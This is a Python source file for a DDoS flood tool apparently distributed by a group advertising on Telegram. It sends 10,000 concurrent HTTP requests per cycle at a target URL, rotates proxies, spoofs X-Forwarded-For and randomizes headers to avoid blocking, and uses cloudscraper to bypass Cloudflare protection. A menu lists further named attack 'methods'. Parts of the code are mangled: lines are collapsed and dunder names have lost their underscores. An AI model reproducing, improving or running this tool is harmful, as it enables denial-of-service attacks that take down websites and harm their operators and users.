#!/usr/bin/env python3

import asyncio import time import random import sys import os import psutil import httpx import aiohttp import requests import cloudscraper from colorama import Fore, Style, init

init(autoreset=True)

# === File loaders ===

def load_lines(filename, fallback=None): try: with open(filename, "r") as f: return [line.strip() for line in f if line.strip()] except: return fallback or []

REFERERS = load_lines("refs.txt", fallback=["https://sts-base.vercel.app/", "http://sts-base.vercel.app/"]) USER_AGENTS = load_lines("uas.txt", fallback=["Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)"])  # Best bypass UAs COOKIES = load_lines("cookies.txt") PROXIES = load_lines("STS.txt")

MAX_CONCURRENT = 10000 REQUEST_TIMEOUT = 10

class AttackEngine: def init(self, method, target, duration): self.method = method.upper() self.target = target self.duration = duration self.start_time = time.time() self.session_headers = {} self.stats = {'total': 0, 'success': 0, 'errors': 0, 'rps': 0, 'peak_rps': 0, 'rcode': None} self.process = psutil.Process(os.getpid()) self.proxy_index = 0

def rotate_proxy(self):
    if not PROXIES:
        return None
    proxy = PROXIES[self.proxy_index % len(PROXIES)]
    self.proxy_index += 1
    return proxy

def get_headers(self):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": random.choice(REFERERS),
        "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4)),
        "Cookie": random.choice(COOKIES) if COOKIES else ""
    }
    headers.update(self.session_headers)
    return headers

async def make_request(self, session):
    headers = self.get_headers()
    try:
        async with session.get(self.target, headers=headers, proxy=self.rotate_proxy(), timeout=REQUEST_TIMEOUT) as response:
            self.stats['rcode'] = response.status
            if response.status == 200 or (self.method.startswith("CC") and response.status in [200, 403]):
                return "SUCCESS"
            elif str(response.status).startswith("4"):
                return "ERROR"
            return "OTHER"
    except Exception:
        return "ERROR"

def solve_cloudflare(self):
    scraper = cloudscraper.create_scraper()
    try:
        res = scraper.get(self.target, timeout=REQUEST_TIMEOUT)
        if res.status_code in [200, 403]:
            self.session_headers = dict(scraper.headers)
    except:
        pass

def update_stats(self, results):
    self.stats['total'] += len(results)
    self.stats['success'] += results.count("SUCCESS")
    self.stats['errors'] += results.count("ERROR")
    elapsed = time.time() - self.start_time
    rps = self.stats['total'] / elapsed if elapsed > 0 else 0
    self.stats['rps'] = rps
    self.stats['peak_rps'] = max(self.stats['peak_rps'], rps)

async def run_attack(self):
    if self.method == "CC-ECLIPSE":
        self.solve_cloudflare()

    connector = aiohttp.TCPConnector(limit=None, ssl=False)
    timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        while time.time() - self.start_time < self.duration:
            tasks = [self.make_request(session) for _ in range(MAX_CONCURRENT)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            self.update_stats(results)
            self.print_status()
            await asyncio.sleep(0.5)

    self.print_summary()

def print_status(self):
    os.system("clear")
    elapsed = time.time() - self.start_time
    remaining = max(0, self.duration - elapsed)
    ram_used = self.process.memory_info().rss / 1024 / 1024

    print(Fore.BLUE + Style.BRIGHT + """

██████  ███████ ███████      ████████ ███████ ███████ ██       ██      ██              ██    ██      ██
██   ███ █████   █████           ██    █████   █████
██    ██ ██      ██              ██    ██      ██
██████  ███████ ██              ██    ███████ ███████ S.T.S - OS-SHARK 2023 | T.ME/STSVKINGDOM """) print("=" * 60) print(f"METHOD: {self.method} | TARGET: {self.target} | TIME: {self.duration}s") print("=" * 60) print(f"REQUESTS: {self.stats['total']} | SUCCESS: {self.stats['success']} | ERRORS: {self.stats['errors']}") print(f"R-CODE: {self.stats['rcode']} | RPS: {self.stats['rps']:.1f} | PEAK RPS: {self.stats['peak_rps']:.1f}") print(f"REMAINING: {remaining:.1f}s | RAM USAGE: {ram_used:.2f} MB") print("=" * 60)

def print_summary(self):
    elapsed = time.time() - self.start_time
    avg_rps = self.stats['total'] / elapsed if elapsed > 0 else 0
    print("\nATTACK COMPLETED")
    print("=" * 60)
    print(f"TARGET: {self.target}")
    print(f"DURATION: {elapsed:.1f}s")
    print(f"TOTAL REQUESTS: {self.stats['total']}")
    print(f"SUCCESS (200/403): {self.stats['success']}")
    print(f"ERRORS (4xx): {self.stats['errors']}")
    print(f"AVERAGE RPS: {avg_rps:.1f}")
    print("=" * 60)

=== Entry point ===

def main(): os.system("clear") print(Fore.BLUE + Style.BRIGHT + """ ██████  ███████ ███████      ████████ ███████ ███████ ██       ██      ██              ██    ██      ██
██   ███ █████   █████           ██    █████   █████
██    ██ ██      ██              ██    ██      ██
██████  ███████ ██              ██    ███████ ███████ S.T.S - OS-SHARK 2023 | T.ME/STSVKINGDOM """)

args = sys.argv
if len(args) == 2 and args[1] == "help":
    print("USAGE: python3 script.py <method> <target> <time>")
    return
elif len(args) == 2 and args[1] == "methods":
    print("""

L7 METHODS:

C-ECLIPSE

CC-ECLIPSE

V-ECLIPSE

VV-ECLIPSE

CKC-ECLIPSE

NEX-ECLIPSE

ZAP-ECLIPSE


L4 METHODS:

DNS-PANZERFAUST

OVH-PANZERFAUST

PPS-PANZERFAUST """) return elif len(args) != 4: print("USAGE: python3 script.py <method> <target> <time>") return

method, target, time_str = args[1], args[2], args[3] if not target.startswith("http"): target = "http://" + target try: duration = int(time_str) except: print("[ERROR] Invalid time input.") return

engine = AttackEngine(method, target, duration) try: asyncio.run(engine.run_attack()) except KeyboardInterrupt: print("\n[!] Attack stopped by user.") except Exception as e: print(f"\n[ERROR] {e}")


if name == "main": main()

